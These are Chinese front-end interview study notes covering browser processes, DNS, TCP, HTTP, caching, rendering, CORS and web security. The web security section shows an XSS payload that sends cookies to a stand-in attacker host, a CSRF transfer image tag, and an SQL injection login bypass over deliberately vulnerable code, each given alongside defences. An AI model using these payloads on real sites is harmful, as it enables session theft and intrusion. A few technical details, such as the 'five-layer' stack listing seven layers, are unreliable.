1. 浏览器的多进程>渲染进程的多线程>js 引擎线程，事件触发线程，gui 渲染线程，定时器线程，http 请求线程
2. 输入 url
3. 解析 url=>DNS 解析
4. 发起 http 请求=>http 下载资源=>http 缓存
5. 浏览器解析资源
6. 绘制页面=>dom 树构建，css 树构建，render 树构建，layout 布局，painting 绘制，display 展示=>回流，重绘的概念
7. js 运行机制=>宏任务>微任务>渲染...反复循环执行

#### 1 浏览器的多进程

进程和线程的区别：

> 进程：工厂 内存资源 cpu 资源分配的最小单位
> 线程：工人 CPU 调度的最小单位

##### 1.1 多进程

1. 主进程：浏览器的主进程（负责协调、主控），只有一个
2. 每个插件进程：每种类型的插件对应一个进程，仅当使用该插件时才创建
3. GPU 进程：最多一个，用于 3D 绘制
4. 每个 tab 页的渲染进程：默认每个 Tab 页面一个进程，互不影响，控制页面渲染，脚本执行，事件处理等（有时候会优化，如多个空白 tab 会合并成一个进程）

##### 1.2 渲染进程下的线程

1. js 引擎线程：负责处理 js 脚本，
2. gui 渲染线程：渲染浏览器的界面，解析 HTML，css，构建 dom 树和 render 树，布局和绘制。js 线程和渲染线程是互斥的，因为 js 会控制 dom，如果同时运行会造成不可预知的错误。
3. 事件触发线程：控制事件循环
4. 定时器线程：负责定时器的触发，当定时器到时间到，如果 js 还在运行，那么就会等运行完毕后再触发
5. http 请求线程：负责发起 http 请求

#### 2 开启网络线程发起 http 请求

主要内容：DNS 查询，tcp/ip 请求构建，五层因特网协议栈

##### 2.1 DNS 查询的过程

**DNS**

> Domain Name System 域名系统。管理 域名<=>IP 的对相应关系

1. 浏览器先搜索自身的 dns 缓存（chrome 缓存的时间只有一分钟）
2. 搜索操作系统自身的缓存，即本地缓存。（window 系统是一天，mac 系统严格根据 DNS 协议中的 TTL）
3. 读取本地 hosts 文件（Hosts 文件也可以建立域名到 IP 地址的绑定关系，可以通过编辑 Hosts 文件来达到名称解析的目的。 例如，我们需要屏蔽某个域名时，就可以将其地址指向一个不存在 IP 地址，以达到屏蔽的效果）
4. dns 域名服务器查询（域名解析，负责执行解析这一操作的就叫解析器，调用解析器后,解析器会向 DNS 服务器（运营商提供的）发送查询消息）
5. 运营商服务会先查找自身缓存找到对应条目。若没有查到，进行下一步
6. 主控服务器会代替浏览器发起一个迭代的 DNS 解析的请求，先查找根域的。运营商服务器拿到域名的 IP，返回给操作系统的内核，同时缓存在了自己的缓存区，操作系统内核从 DNS 服务商拿来的 IP 地址返回给浏览器

##### 2.2 tcp/ip 请求

TCP 是面向连接的，无论哪一方向另一方发送数据之前，都必须先在双方之间建立一条连接
![连接过程](http://p3.pstatp.com/large/pgc-image/1529747996774b392bcf214)

1. 三次握手建立连接
    > 三次握手的目的是同步连接双方的序列号和确认号并交换 TCP 窗口大小信息

-   第一次握手： 建立连接。客户端发送连接请求报文段，将 SYN 位置为 1，Sequence Number 为 x；然后，客户端进入 SYN_SEND 状态，等待服务器的确认；。
-   第二次握手：服务器收到 SYN 报文段。服务器收到客户端的 SYN 报文段，需要对这个 SYN 报文段进行确认，设置 Acknowledgment Number 为 x+1(Sequence Number+1)；同时，自己还要发送 SYN 请求信息，将 SYN 位置为 1，Sequence Number 为 y；服务器端将上述所有信息放到一个报文段（即 SYN+ACK 报文段）中，一并发送给客户端，此时服务器进入 SYN_RECV 状态
-   第三次握手：客户端收到服务器的 SYN+ACK 报文段。然后将 Acknowledgment Number 设置为 y+1，向服务器发送 ACK 报文段，这个报文段发送完毕以后，客户端和服务器端都进入 ESTABLISHED 状态，完成 TCP 三次握手。

2. 为什么要进行三次握手？
    > 为了防止已失效的连接请求报文段突然又传送到了服务端，因而产生错误。
    > 具体例子：“已失效的连接请求报文段”的产生在这样一种情况下：
    >
    > > client 发出 的第一个连接请求报文段并没有丢失，而是在某个网络结点长时间的滞留了，以致延误到连接释放以后的某个时间才到达 server。本来这是一个早已失效的报文段。但 server 收到此失效的连接请求报文段后，就误认为是 client 再次发出的一个新的连接请求。于是就向 client 发出确认报文段，同意建立连接。假设不采用“三次握手”，那么只要 server 发出确认，新的连接就建立了。由于现在 client 并没有发出建立连接的请求，因此不会理睬 server 的确认，也不会向 server 发送数据。但 server 却以为新的运输连接已经建立，并一直等待 client 发来数据。这样，server 的很多资源就白白浪费掉了。采用“三次握手”的办法可以防止上述现象发生。例如刚才那种情况，client 不会向 server 的确认发出确认。server 由于收不到确认，就知道 client 并没有要求建立连接。
3. 四次挥手

![断开过程](http://p3.pstatp.com/large/pgc-image/15297479967476b1ee9b281)

-   第一次分手： 主机 1（可以使客户端，也可以是服务器端），设置 Sequence Number，向主机 2 发送一个 FIN 报文段；此时，主机 1 进入 FIN_WAIT_1 状态；这表示主机 1 没有数据要发送给主机 2 了；

-   第二次分手： 主机 2 收到了主机 1 发送的 FIN 报文段，向主机 1 回一个 ACK 报文段，Acknowledgment Number 为 Sequence Number 加 1；主机 1 进入 FIN_WAIT_2 状态；主机 2 告诉主机 1，我“同意”你的关闭请求；

-   第三次分手： 主机 2 向主机 1 发送 FIN 报文段，请求关闭连接，同时主机 2 进入 LAST_ACK 状态；

-   第四次分手： 主机 1 收到主机 2 发送的 FIN 报文段，向主机 2 发送 ACK 报文段，然后主机 1 进入 TIME_WAIT 状态；主机 2 收到主机 1 的 ACK 报文段以后，就关闭连接；此时，主机 1 等待 2MSL 后依然没有收到回复，则证明 Server 端已正常关闭，那好，主机 1 也可以关闭连接了。

4. 为什么要四次分手？
    > TCP 协议是一种面向连接的、可靠的、基于字节流的运输层通信协议。TCP 是全双工模式，这就意味着，当主机 1 发出 FIN 报文段时，只是表示主机 1 已经没有数据要发送了，主机 1 告诉主机 2，它的数据已经全部发送完毕了；但是，这个时候主机 1 还是可以接受来自主机 2 的数据；当主机 2 返回 ACK 报文段时，表示它已经知道主机 1 没有数据发送了，但是主机 2 还是可以发送数据到主机 1 的；当主机 2 也发送了 FIN 报文段时，这个时候就表示主机 2 也没有数据要发送了，就会告诉主机 1，我也没有数据要发送了，之后彼此就会愉快的中断这次 TCP 连接。
5. tcp/ip 的并发限制
    > 浏览器对同一域名下并发的 tcp 连接是有限制的（2-10 个不等,而且在 http1.0 中往往一个资源下载就需要对应一个 tcp/ip 请求，所以针对这个瓶颈，又出现了很多的资源优化方案。雪碧图

##### 2.3 五层因特网协议栈

1. 应用层：http,ftp 协议
2. 表示层：主要处理两个通信系统中交换信息的表示方式，包括数据格式交换，数据加密与解密，数据压缩与终端类型转换等
3. 会话层：它具体管理不同用户和进程之间的对话，如控制登陆和注销过程
4. 传输层：TCP 和 UDP 协议
5. 网络层：IP 协议
6. 数据链路层：待传送的数据加入一个以太网协议头，并进行 CRC 编码，封装成帧
7. 物理层：利用物理介质传输比特流

#### 3 从服务器接收到请求到对应后台接收到请求

服务端在接收到请求时，内部会进行很多的处理

##### 3.1 负载均衡

> 对于大型的项目，由于并发访问量很大，所以往往一台服务器是吃不消的，所以一般会有若干台服务器组成一个集群，然后配合反向代理实现负载均衡

1. 用户发起的请求都指向调度服务器（反向代理服务器，譬如安装了 nginx 控制负载均衡），然后调度服务器根据实际的调度算法，分配不同的请求给对应集群中的服务器执行，然后调度器等待实际服务器的 HTTP 响应，并将它反馈给用户

##### 3.2 后台的处理

一般后台都是部署到容器中的，所以一般为：

1. 先是容器接受到请求（如 tomcat 容器）
2. 然后对应容器中的后台程序接收到请求（如 java 程序）
3. 后台会有自己的统一处理，处理完后响应响应结果
   概括下：
4. 后台的统一拦截，如果没通过拦截，直接返回响应的 http 保卫
5. 验证通过后，进入实际的后台代码，执行后台代码进行数据库查询，数据计算
6. 程序执行完毕后，返回响应的 http 包
7. 将这个包从后端发到前端

#### 4 后台和前台的 http 交互

#####4.1 http 报文结构
通用头部，请求/响应头部，请求/响应体

1. 通用头部

```
Request Url: 请求的web服务器地址
Request Method: 请求方式（Get、POST、OPTIONS、PUT、HEAD、DELETE、CONNECT、TRACE）
Status Code: 请求的返回状态码，如200代表成功
Remote Address: 请求的远程服务器地址（会转为IP）
```

1.1 Method 分为两批次

> http1.0 定义了三种：get post head
> http1.1 新增了五种：options put delete trace connect

1.2 状态码

```
1XX-指示信息，代表请求已经收到，继续处理
2XX-成功，请求已被成功接收、理解、接收
3XX-重定向，
4XX-客户端出错，
5XX-服务器端出错
```

2. 请求头部（部分）

```
Accept: 接收类型，表示浏览器支持的MIME类型
（对标服务端返回的Content-Type）
Accept-Encoding：浏览器支持的压缩类型,如gzip等,超出类型不能接收
Content-Type：客户端发送出去实体内容的类型
Cache-Control: 指定请求和响应遵循的缓存机制，如no-cache
If-Modified-Since：对应服务端的Last-Modified，用来匹配看文件是否变动，只能精确到1s之内，http1.0中
Expires：缓存控制，在这个时间内不会请求，直接使用缓存，http1.0，而且是服务端时间
Max-age：代表资源在本地缓存多少秒，有效时间内不会请求，而是使用缓存，http1.1中
If-None-Match：对应服务端的ETag，用来匹配文件内容是否改变（非常精确），http1.1中
Cookie: 有cookie并且同域访问时会自动带上
Connection: 当浏览器与服务器通信时对于长连接如何进行处理,如keep-alive
Host：请求的服务器URL
Origin：最初的请求是从哪里发起的（只会精确到端口）,Origin比Referer更尊重隐私
Referer：该页面的来源URL(适用于所有类型的请求，会精确到详细页面地址，csrf拦截常用到这个字段)
User-Agent：用户客户端的一些必要信息，如UA头部等
```

3. 响应头部(部分)

```
Access-Control-Allow-Headers: 服务器端允许的请求Headers
Access-Control-Allow-Methods: 服务器端允许的请求方法
Access-Control-Allow-Origin: 服务器端允许的请求Origin头部（譬如为*）
Content-Type：服务端返回的实体内容的类型
Date：数据从服务器发送的时间
Cache-Control：告诉浏览器或其他客户，什么环境可以安全的缓存文档
Last-Modified：请求资源的最后修改时间
Expires：应该在什么时候认为文档已经过期,从而不再缓存它
Max-age：客户端的本地资源应该缓存多少秒，开启了Cache-Control后有效
ETag：请求变量的实体标签的当前值
Set-Cookie：设置和页面关联的cookie，服务器通过这个头部把cookie传给客户端
Keep-Alive：如果客户端有keep-alive，服务端也会有响应（如timeout=38）
Server：服务器的一些相关信息
```

4.  请求头部和响应头部对应的字段
    请求头：Accept 响应头：Content-Type
    请求头：Origin 跨域 响应头：Access-Control-Allow-Origin
    请求头：If-Modified-Since 缓存 响应头：Last-Modified
    请求头：If-None-Match 缓存 响应头：ETag

5.  CRLF
    意思是回车换行，一般作为分隔符存在
    #####4.2 cookie 优化
    因为请求同域名的资源请求时，浏览器会默认带上本地的 cookie，针对这种情况，在某些场景下是需要优化的。
    场景：

        ```
        客户端在域名A下有cookie（这个可以是登陆时由服务端写入的）
        然后在域名A下有一个页面，页面中有很多依赖的静态资源（都是域名A的，譬如有20个静态资源）
        此时就有一个问题，页面加载，请求这些静态资源时，浏览器会默认带上cookie
        也就是说，这20个静态资源的http请求，每一个都得带上cookie，而实际上静态资源并不需要cookie验证
        此时就造成了较为严重的浪费，而且也降低了访问速度（因为内容更多了）
        ```

        此时可以进行多域名拆分：

        - 将静态资源分组，分别放到不同的域名下（如 static.base.com）
        - 而 page.base.com（页面所在域名）下请求时，是不会带上 static.base.com 域名的 cookie 的，所以就避免了浪费
          拆分成多域名时，在移动端会降低请求速度。因为域名整套解析流程是很耗费时间的，而且移动端一般带宽都比不上 pc，此时可以用 dns-prefetch 进行优化（让浏览器空闲时提前解析 dns 域名，不过也请合理使用，勿滥用）

#####4.3 长连接和短连接
tcp/ip 层面的定义：

> 长连接：个 tcp/ip 连接上可以连续发送多个数据包，在 tcp 连接保持期间，如果没有数据包发送，需要双方发检测包以维持此连接，一般需要自己做在线维持（类似于心跳包）
> 短连接：通信双方有数据交互时，就建立一个 tcp 连接，数据发送完成后，则断开此 tcp 连接
> 在 http 中：
> http1.0：默认使用的是短连接，也就是说，浏览器每进行一次 http 操作，就建立一次连接，任务结束就中断连接，譬如每一个静态资源请求时都是一个单独的连接
> http1.1：默认使用的是长连接。使用长连接会有这一行 Connection: keep-alive，在长连接的情况下，当一个网页打开完成后，客户端和服务端之间用于传输 http 的 tcp 连接不会关闭，如果客户端再次访问这个服务器的页面，会继续使用这一条已经建立的连接

#####4.4 http2.0

> 2.0 的一些特性：

-   多路复用（即一个 tcp/ip 连接可以请求多个资源）
-   首部压缩（http 头部压缩，减少体积）
-   二进制分帧（在应用层跟传送层之间增加了一个二进制分帧层，改进传输性能，实现低延迟和高吞吐量）
-   服务器端推送（服务端可以对客户端的一个请求发出多个响应，可以主动通知客户端）
-   请求优先级（如果流被赋予了优先级，它就会基于这个优先级来处理，由服务器决定需要多少资源来处理该请求。
    2.0 和 1.1 显著的不同点
    > 1.1 中，请求一个资源，都是需要开启一个 tcp/ip 连接的，所以对应的结果是，每一个资源对应一个 tcp/ip 请求，由于 tcp/ip 本身有并发数限制，所以当资源一多，速度就显著慢下来
    > 2.0 中，一个 tcp/ip 请求可以请求多个资源，也就是说，只要一次 tcp/ip 请求，就可以请求若干个资源，分割成更小的帧请求，速度明显提升。

>2.0因为一个tcp/ip可以传递多个资源，此时如果出现网络情况不好，出现丢包的情况下，整个 TCP 都要开始等待重传，也就导致了后⾯的所有数据都被阻塞了.但是对于 HTTP/1 来说，可以开启
多个 TCP 连接，出现这种情况反到只会影响其中⼀个连接，剩余的TCP 连接还可以正常传输数据。
>因为这个情况，google搞了⼀个基于 UDP 协议的QUIC 协议,并且使⽤在了 HTTP/3 上，当然 HTTP/3 之前名为HTTP-over-QUIC.
#####4.5 https
https 就是安全版本的 http，譬如一些支付等操作基本都是基于 https 的，因为 http 请求的安全系数太低了。

-   https 与 http 的区别：**在请求前，会建立 ssl 链接，确保接下来的通信都是加密的，无法被轻易截取分析**
-   HTTP 2.0 在 2013 年 8 月进行首次合作共事性测试。在开放互联网上 HTTP 2.0 将只用于 https 网址，而 http 网址将继续使用 http1.x，目的是在开放互联网上增加使用加密技术，以提供强有力的保护去遏制主动攻击。
    ssl 协议的握手过程
    > 第一步：客户端给出协议版本号、一个客户端生成的随机数（Client random），以及客户端支持的加密方法。
    > 第二步：服务器端确认双方使用的加密方法，并给出数字证书、以及一个服务器生成的随机数（Server random）。
    > 第三步：客户端确认数字证书有效，然后生成一个新的随机数（Premaster secret），并使用数字证书中的公钥，加密这个随机数，发给服务器端。
    > 第四步：服务器使用自己的私钥，获取客户端发来的随机数（即 Premaster secret）。
    > 第五步：客户端和服务器端根据约定的加密方法，使用前面的三个随机数，生成"对话密钥"（session key），用来加密接下来的整个对话过程。

####5 http 缓存
http 缓存分为强缓存（200 from cache）和协商缓存(304)
![缓存](https://pic3.zhimg.com/80/v2-c7562f5345c992e993623e378e685bde_hd.jpg)
#####5.1 强缓存（200 from cache）
浏览器如果判断本地缓存未过期，就直接使用，无需发起 http 请求

-   属于强缓存控制的请求头：
    > http1.1:Cache-Control/Max-Age
    > http1.0:Pragma/Expires
    > #####5.2 协商缓存（304 from cache）
           浏览器向服务器发送http请求,然后服务端告诉浏览器文件未改变，让浏览器使用本地缓存
-   属于协商缓存控制的请求头：
    > http1.1 If-None-Match/E-tag
    > http1.0 If-Modified-Since/Last-Modified

在 html 页面使用*META HTTP-EQUIV="Pragma" CONTENT="no-cache"*也可以控制缓存，但是对缓存代理服务器不适用
#####5.3 1.0 和 1.1 缓存的区别

-   max-age 和 expires
    > **expires** 使用的是服务器时间。但是如果客户端时间和服务端不同步,那么缓存就会出现问题
    > **max-age** 使用的是绝对时间,由浏览器根据自己的时间+绝对值进行计算
    > **如果同时开启了 Cache-Control 与 Expires，Cache-Control 优先级高。**
-   E-tag 和 Last-Modified

    > Last-Modified

    -   表明服务端的文件最后何时改变的
    -   它有一个缺陷就是只能精确到 1s
    -   然后还有一个问题就是有的服务端的文件会周期性的改变，导致缓存失效

    > **E-tag**

    -   是一种指纹机制，代表文件相关指纹
    -   只有文件变才会变，也只要文件变就会变
    -   也没有精确时间的限制，只要文件一变，立马 E-tag 就不一样了
        > **如果同时带有 E-tag 和 Last-Modified，服务端会优先检查 E-tag**

#### 6 解析页面

浏览器内核拿到内容后，开始解析渲染

```
1 解析HTML，构建dom tree
2 解析css ,生成css规则树
3 合并dom tree和css规则树，生成render树
4 布局render树，layout
5 绘制render树，painting
6 浏览器将各层的信息发给GPU，GPU将各层的合成composite,显示在屏幕上
```

![解析页面](https://pic3.zhimg.com/80/v2-2a7db99cc39992e3c605926b37939042_hd.jpg)
#####6.1 构建 DOM 树
解析 HTML=>构建 DOM 树
简单的流程

> Bytes → characters → tokens → nodes → DOM

![解析HTML](https://pic4.zhimg.com/80/v2-83fcb412ec495490e5cde63dbee3bda3_hd.jpg)
最终生成的 dom 树：
![解析HTML](https://pic1.zhimg.com/80/v2-35af31bdddd6fad8dc05ca2fae7f373c_hd.jpg)

#####6.2 构建 CSS 树
解析 css=>生成 css 规则树
简单的流程

> Bytes → characters → tokens → nodes → DOM

与构建 dom 树类似，最终生成如下图所示的：
![生成的css树](https://pic1.zhimg.com/80/v2-1d9906f57c60d8d8edca1df783cd9458_hd.jpg)

#####6.3 构建 render 树
拿到 dom 树和 css 规则树后，就开始构建 dom 树了。
一般来说，render 树和 dom 树是对应的，可是有些 dom 为 display：none
最终生成如下图所示：
![生成的css树](https://pic1.zhimg.com/80/v2-1e04ec8a59e1818d24570ac0fefcf9cc_hd.jpg)
#####6.4 渲染
渲染过程如下图：
![渲染](https://pic2.zhimg.com/80/v2-0599b3c17ba850103cd0bd9145f5c8e5_hd.jpg))

1. 计算样式
2. 构建渲染树
3. 布局 主要定位坐标和大小，是否换行，各种 position overflow z-index 属性 => 回流
4. 绘制 => 重绘
   渲染页面时重要的两个事情：回流和重绘

#####6.5 回流和重绘

-   **1 回流：Reflow**
    > 元素的内容、结构、位置或尺寸发生了变化，需要重新计算样式和渲染树
-   2 引发回流的原因:

    > 1 页面渲染初始化
    > 2 dom 结构发生变化
    > 3 render 树发生变化,比如元素的盒模型改变
    > 4 窗口 resize
    > 5 获取某种属性:offset(Top/Left/Width/Height),scroll(Top/Left/Width/Height),cilent(Top/Left/Width/Height),width,height,调用了 getComputedStyle()或者 IE 的 currentStyle,getBoundClientRect,改变字体大小也是回流

    > 6 **回流必定会引起重绘**

-   3 优化方案：
    > 1 减少逐项更改样式，最好一次性更改 style，或者将样式定义为 class 并一次性更新
    > 2 避免循环操作 dom，创建一个 documentFragment 或 div，在它上面应用所有 DOM 操作，最后再把它添加到 window.document
    > 3 避免多次读取 offset 等属性。无法避免则将它们缓存到变量
    > 4 将复杂的元素绝对定位或固定定位，使得它脱离文档流，否则回流代价会很高
-   **4 重绘：Repaint**
    > 元素发生的改变只是影响了元素的一些外观之类的时候（例如，背景色，边框颜色，文字颜色等），此时只需要应用新样式绘制这个元素就可以了

#####6.6 简单图层和复合图层

1. 简单图层
    > 1.1 普通文档流内可以理解为一个复合图层（这里称为默认复合层，里面不管添加多少元素，其实都是在同一个复合图层中）
    > 1.2 absolute 和 fixed 元素虽然脱离了普通文档流，但仍在同一个复合图层中
2. 复合图层 >2.1 开启硬件加速可以开启一个新的复合图层。复合图层之间是相互独立的,绘制的时候互不干扰,由 GPU 绘制 >2.2 所有做动画的时候一般使用硬件加速开启个图层.开启图层的时候注意使用 zindex,防止浏览器默认给后续的元素创建复合层渲染
   ####7 css 和 js 相关知识
   #####7.1 盒模型 块元素 行内元素 BFC IFC => css 参考 css 目录
   #####7.2 JS 执行上下文 VO AO 作用域链 this 指向 => js 参考 js 目录
   #####7.3 js 垃圾回收机制
3. 标记清除
    > js 引擎基础 GC 方案(simple GC ):mark and sweep(标记清除)
    - 遍历所有可访问的对象,
    - 回收已不可访问的对象
    ```
    当变量进入环境时，例如，在函数中声明一个变量，就将这个变量标记为“进入环境”。从逻辑上讲，永远不能释放进入环境的变量所占用的内存，因为只要执行流进入相应的环境，就可能会用到它们。
    而当变量离开环境时，则将其标记为“离开环境”。
    垃圾回收器在运行的时候会给存储在内存中的所有变量都加上标记（当然，可以使用任何标记方式）。
    然后，它会去掉环境中的变量以及被环境中的变量引用的变量的标记（闭包，也就是说在环境中的以及相关引用的变量会被去除标记）。
    而在此之后再被加上标记的变量将被视为准备删除的变量，原因是环境中的变量已经无法访问到这些变量了。
    最后，垃圾回收器完成内存清除工作，销毁那些带标记的值并回收它们所占用的内存空间
    ```
4. 引用计数
    ```
    跟踪记录每个值被引用的次数，当一个值被引用时，次数+1，减持时-1，下次垃圾回收器会回收次数为0的值的内存（当然了，容易出循环引用的bug）
    ```
5. **GC 的缺陷**
    > GC 时，停止响应其他操作.而 Javascript 的 GC 在 100ms 甚至以上
6. **GC 优化策略**
   使用:_分代回收_
    > 1 多回收“临时对象”区（young generation）
    > 2 少回收“持久对象”区（tenured generation）
    > 3 减少每次需遍历的对象，从而减少每次 GC 的耗时。

#### 8 跨域

#####8.1 同源政策

> 同源指的是:协议相同,域名相同,端口号相同.

-   1 同源的目的: 是为了保护用户信息的安全,防止恶意的网站窃取数据
-   2 同源限制了哪些东西:
    > 2.1 cookie localStorage 和 indexDB
    > 2.2 dom 无法获取
    > 2.3 ajax 请求

#####8.2 不同源的网站通信问题

> 如果在 iframe 中,父窗口和子窗口不同源,可以采用以下方法进行通信

-   1 改变 iframe src 中的锚点.子窗口监听 hash 值的改变,获取对应的信息

    ```
    var src = originURL + '#' + data;
    document.getElementById('myIFrame').src = src;
    window.onhashchange = checkMessage;

    function checkMessage() {
    var message = window.location.hash;
    // ...
    }
    ```

-   2 使用 window.name 属性
    > 这个属性的最大特点是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。
-   3 使用 otherWindow.postMessage > h5 为了解决跨域通信的问题,引入了 postMessage API.此 api 的详细信息参考[postmessage](js/postMessage1.html) - 通过 postMessage,可以读取其他窗口的 localStorage 信息
    #####8.3 不同源的网站 ajax 通信
    因为同源政策限制,ajax 请求不能发送给不同源的网站.为此有以下几种方法解决
-   1 JSONP
    > 该方法利用 script 标签可以请求不同源的文件.然后在 src 属性上传递回调参数.这样请求回来的文件解析时就会触发相应的回调函数
-   2 websocket

    > WebSocket 是一种通信协议，使用 ws://（非加密）和 wss://（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。

    WebSocket 请求的头信息

    ```
    GET /chat HTTP/1.1
    Host: server.example.com
    Upgrade: websocket
    Connection: Upgrade
    Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
    Sec-WebSocket-Protocol: chat, superchat
    Sec-WebSocket-Version: 13
    Origin: http://example.com //表示该请求的请求源（origin），即发自哪个域名
    ```

    **正是因为 Origin 字段,服务器可以根据这个字段，判断是否许可本次通信,所以 WebSocket 才没有实行同源政策**

##### 8.4 单独的 CORS

> 跨源资源分享（Cross-Origin Resource Sharing）的缩写.它是 W3C 标准，是跨源 AJAX 请求的根本解决方法。相比 JSONP 只能发 GET 请求，CORS 允许任何类型的请求。

4.1 **CORS 中分为简单请求和非简单请求**,满足以下条件的就是简单请求

1. 请求方法是以下三种方法之一：
    - head,
    - get
    - post
2. HTTP 的头信息不超出以下几种字段
    - Accept
    - Accept-Language
    - Content-Language
    - Last-Event-ID
    - Content-Type：只限于三个值 application/x-www-form-urlencoded、multipart/form-data、text/plain

4.2 **简单请求**

1. 对于简单请求，浏览器直接发出 CORS 请求。具体来说，就是在头信息之中，增加一个 Origin 字段。

4.3 **非简单请求**

```
    OPTIONS /cors HTTP/1.1
    Origin: http://api.bob.com
    Access-Control-Request-Method: PUT
    Access-Control-Request-Headers: X-Custom-Header
    Host: api.alice.com
    Accept-Language: en-US
    Connection: keep-alive
    User-Agent: Mozilla/5.0...
```

    1. 对应的是PUT,DELETE请求,或者post请求但是content-type是application/json
    2. 非简单请求,会在正式通信之前,增加一次http查询请求,称为"预检"请求（preflight）.预检请求使用的方式是options.

4.4 **预检请求**

1. 请求头主要的字段:
    > Origin
    > Access-Control-Request-Method
    > Access-Control-Request-Headers:该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段
2. 响应头

```
        HTTP/1.1 200 OK
        Date: Mon, 01 Dec 2008 01:15:39 GMT
        Server: Apache/2.0.61 (Unix)
        Access-Control-Allow-Origin: http://api.bob.com
        Access-Control-Allow-Methods: GET, POST, PUT
        Access-Control-Allow-Headers: X-Custom-Header
        Content-Type: text/html; charset=utf-8
        Content-Encoding: gzip
        Content-Length: 0
        Keep-Alive: timeout=2, max=100
        Connection: Keep-Alive
        Content-Type: text/plain
```

-   响应头主要的字段:
    > Access-Control-Allow-Origin
    > Access-Control-Allow-Methods: GET, POST, PUT
    > Access-Control-Allow-Headers: X-Custom-Header
    > Access-Control-Allow-Credentials: true
    > Access-Control-Max-Age: 1728000
-   **响应头中的 Max-Age**
    > 用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是 20 天（1728000 秒），即允许缓存该条回应 1728000 秒（即 20 天），在此期间，不用发出另一条预检请求。

4.5 **如何在 cors 中传递 cookie**

-   1 在服务器端设置 Access-Control-Allow-Credentials 为 true.
    > 该字段表示是否允许发送 Cookie
-   2 在 ajax 请求中设置 xhr.withCredentials = true
-   3 Access-Control-Allow-Origin 就不能设为星号，必须指定明确的、与请求网页一致的域名.

    > 同时，Cookie 依然遵循同源政策，只有用服务器域名设置的 Cookie 才会上传，其他域名的 Cookie 并不会上传，且（跨源）原网页代码中的 document.cookie 也无法读取服务器域名下的 Cookie。

#### 9 web 安全

常见的 web 安全问题：1 csrf（跨站请求伪造）2 xss（跨站脚本注入）3 sql 注入

#####9.1 **CSRF（跨站请求伪造）** > 特征：**冒用用户身份，进行恶意操作**，前提是用户已经登录了账号，没有退出，然后访问危险网站。

![CSRF](https://segmentfault.com/img/remote/1460000012693783?w=904&h=739)

```
1 采用cookie来进行用户校验
2 登录受信任网站A，并在本地生成Cookie
3 在不登出A的情况下，访问危险网站B
4 危险网站B调用指向A的接口发出攻击，整个情况没有获取A的cookie，利用web的cookie隐式身份验证机制来攻击。即使A的cookie是http-only，也会中招
```

防御 CSRF 攻击的手段：

-   1 验证 http 的 Referer 字段，但是完全依赖浏览器发送正确的 referer,也不是很可靠。因为完全依靠浏览器的具体实现，存在浏览器被破解的篡改其 referer 字段的可能
-   2 在请求参数中加入 token 验证，比如 post 中，以参数的形式加个随机产生的 token

#####9.2 **XSS（跨域脚本注入）** > 特征:击者通过某种方式将恶意代码注入到网页上，然后其他用户观看到被注入的页面内容后会受到特定攻击

2.1 **cookie 劫持** _攻击者获取到用户的 cookie_

> 例如，页面有一个评论输入，输入后会，因为后台的漏洞，没有过滤特殊字符，会直接明文保存到数据库中，然后展示到网页时直接展示明文数据。

```
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<form action="saveComment.jsp" method="post">
     请输入评论内容：<BR>
     <input name="content" type="text">
     <input type="submit" value="确认">
</form>
```

> 然后攻击者分析后，输入

```
script>window.open("http://www.attackpage.com/record?secret=" + document.cookie)</script>
```

由于没有过滤脚本，**那么其它用户登陆后，在看到这篇文章时就会自动将他们的 cookie 信息都发送到了攻击者的服务器。攻击者可以在 cookie（譬如 jsessionid 对应的 session）有效期内拿它们冒充用户操作。**
_这里是拿到了 cookie 后主动冒充用户的，而 CSRF 中根本就不知 cookie，仅利用浏览器的隐式校验方式冒充用户。_

2.2 回话伪造。XSS 形成的 CSRF

> 同样是评论漏洞的示例。攻击者输入（举例比喻）

```
<img src=http://www.bank.example/transfer?toBankId=hello&amount=1000000 width='0' height='0'>
```

> 然后接下来发生的事情和 CSRF 中提到的一致。

**这里也没有拿到网站的 cookie，而是借助浏览器的隐式校验机制来冒充客户**

2.3 **其他恶意代码执行**

> 专指前端的流氓 JS，譬如前面的输入可以是：
> 1 游戏弹窗
> 2 无限循环的代码
> 3 让页面直接卡死

还有**富文本攻击**，在富文本中注入了脚本，前后端未过滤，导致直接输入到了页面上。
**结论：**
**只要最终能向页面输出可执行的脚本语句，那么就是有漏洞，XSS 攻击都有可能发生。**

防御 XSS 的手段：

-   1 输入过滤。不信任用户的输入，过滤其中的“<”、“>”、“/”等可能导致脚本注入的特殊字符。或者过滤 script”、“javascript”等脚本关键字，或者对输入数据的长度进行限制等等，还要考虑攻击者使用十六进制编码来输入脚本的方式。
-   2 输出进行编码。和输入过滤类似，不过是从输出上着手，数据输出到页面时，经过 HtmlEncoder 等工具编码，这样就不会存在直接输出可执行的脚本了
-   3 cookie 设置 http-only，这样用脚本就无法获取 cookie 了，避免脚本使用 document.cookie 获取网站的 cookie
-   4 cookie 防盗，尽可能地避免在 Cookie 中泄露隐私，如用户名、密码等
-   5 后台不能信任前端的输入，一定要进行过滤

#####9.3 SQL 注入

> 如果后台没有过滤前端的输入数据,那么就可能形成 SQL 注入

假设页面 A 中有一个登陆查询存在拙劣的 sql 注入漏洞，这样子的：（最极端，最傻的情况）

```
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<form action="login.jsp" method="post">
     请输入用户名与密码：<BR>
     <input name="name" type="text">
     <input name="password" type="text">
     <input type="submit" value="登陆">
</form>
```

在接收到登陆请求后，服务端的实际执行代码时是：

```
String sql = "SELECT * FROM users WHERE name = '" + name + "' AND password = '" + password + "'";
```

然而有攻击者分析出后台可能存在漏洞，尝试 sql 注入攻击，输入

```
name = ''
password = ''  or 1=1
```

那么这样，后台接收到数据后，实际上查询的结果是

```
SELECT * FROM users WHERE name = '''' AND password = '''' or 1=1
```

故而，攻击者成功的绕过的用户名，利用后台漏洞登陆了。

#### 10 错误处理机制

##### 10.1 js 脚本运行出现的错误

-   1 try-catch
-   2 window.error
-   3 跨域脚本出现的错误会显示 Script error,给 script 标签添加 crossorigin 属性

##### 10.2 资源加载出现的错误

-   1 图片加载因为某些原因加载不出来时，使用 obj.onerror
-   2 window.error

#### 11 viewport 移动端相关知识

#### 12 性能优化

##### 1 常用优化手段

